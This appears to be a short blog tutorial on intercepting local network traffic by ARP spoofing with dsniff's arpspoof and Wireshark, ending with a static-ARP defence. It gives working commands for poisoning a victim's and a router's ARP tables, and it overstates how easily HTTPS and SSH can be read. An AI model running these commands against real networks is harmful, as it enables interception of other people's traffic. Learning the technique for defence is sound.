---
layout: post
title: "Intercepting net traffic with dsniff"
description: "Using some tools we can intercept data in our local network following simple steps"
redirect_from: /article/intercepting-net-traffic-with-dsniff/
locale: en
---

### A bit of theory
The ARP table functions as a cache for fast access to IP addresses  that you visit frequently, usually the router is the only entry that we have cached in the table because is the machine that routes the IP packages outwards.
 The router auto-discover itself in the network with a signal that causes that all the equipment in the network automatically add an entry in its ARP cache in order to access internet.
 The danger of this action by default is that any machine can pose as a router, that is, become the guide of our IP packets network to which it belongs. A router obviously not analyze IP packets, but a malicious computer could decapsulation different levels of IP and extract unauthorized information.

### What we have to know
**Router IP Address:** The local area network IP address of the router  that we are connected to us and the victim.
**Ip address of the victim: **The victim local area network IP address to which we wish to poison their ARP table.

### The attack
Suposing we've installed a linux with dsniff tool, we have to enable routing in system's kernel:

    sysctl -w net.ipv4.ip_forward=1

We have to create two different process for establishing a connection between the two machines (router and victim) and us:

    arpspoof -i eth0 ROUTER_IP_ADDRESS -t VICTIM_IP_ADDRESS

    arpspoof -i eth0 VICTIM_IP_ADDRESS -t ROUTER_IP_ADDRESS

Now we can execute **Wireshark** (Packet analyzer) and view what is the information encapsulated in the IP packets sended between router and victim.
As this tecnique is like a *man in the middle* (We are between victim and router), we also can know SSL encrypted information like HTTPS or SSH protocols can offer, we only have to emulate a secure server.

### How to prevent it
First we have to know the router hardware address (MAC), for it we can search in our ARP table an address like router with:

    arp

Once we know the MAC, we have to add manually a permanent ARP entry with the next command:

    arp -s ROUTER_IP_ADDRESS ROUTER_HW_ADDRESS
